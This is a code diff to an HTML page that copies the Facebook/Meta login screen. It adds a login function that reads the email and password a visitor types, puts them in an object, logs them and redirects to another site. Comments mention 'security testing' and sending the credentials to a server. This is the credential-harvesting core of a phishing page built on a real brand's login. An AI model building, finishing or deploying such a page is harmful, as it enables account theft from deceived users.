@@ -199,12 +199,12 @@ footer small {
     </style> 
     
     <script>
-        function login() {
-            // Add your login logic here
-            // For example, you can redirect the user to a login page or perform some authentication process
-            // You can also use libraries like jQuery or frameworks like Angular or React for more complex interactions
-            alert("Login button clicked!"); // This is just a placeholder action
-        }
+        // function login() {
+        //     // Add your login logic here
+        //     // For example, you can redirect the user to a login page or perform some authentication process
+        //     // You can also use libraries like jQuery or frameworks like Angular or React for more complex interactions
+        //     alert("Login button clicked!"); // This is just a placeholder action
+        // }
     </script>
 
 </head>
@@ -218,8 +218,8 @@ footer small {
             </div>
             <div class="col-form">
                 <div class="form-container">
-                    <input type="text" placeholder="Email or phone number">
-                    <input type="password" placeholder="Password">
+                    <input type="text" id="email" placeholder="Email or phone number">
+                    <input type="password" id="password" placeholder="Password">
                     <button class="btn-login" onclick="login()">Login</button>
                     <a href="#">Forgotten password?</a>
                     <button class="btn-new">Create new Account</button>
@@ -285,9 +285,30 @@ footer small {
                 <li><a href="#">Instagram</a></li>
                 <li><a href="#">Local</a></li>
             </ol>
-            <small>Meta © 2022</small>
+            <small>Meta © 2023</small>
         </div>
     </footer>
+    <script>
+        function login() {
+            // Capture user input
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Save user credentials (this is just a sample, do not store passwords like this in production)
+            var credentials = {
+                email: email,
+                password: password
+            };
+
+            // You can now send the 'credentials' object to your server or perform any other actions as needed
+            // For security testing purposes, you can display the captured data in the console
+            console.log("Email: " + credentials.email);
+            console.log("Password: " + credentials.password);
+
+            // Redirect to Facebook.com (this is just a sample URL)
+            window.location.href = "https://www.tradingview.com";
+        }
+    </script>
 </body>
 
 </html>
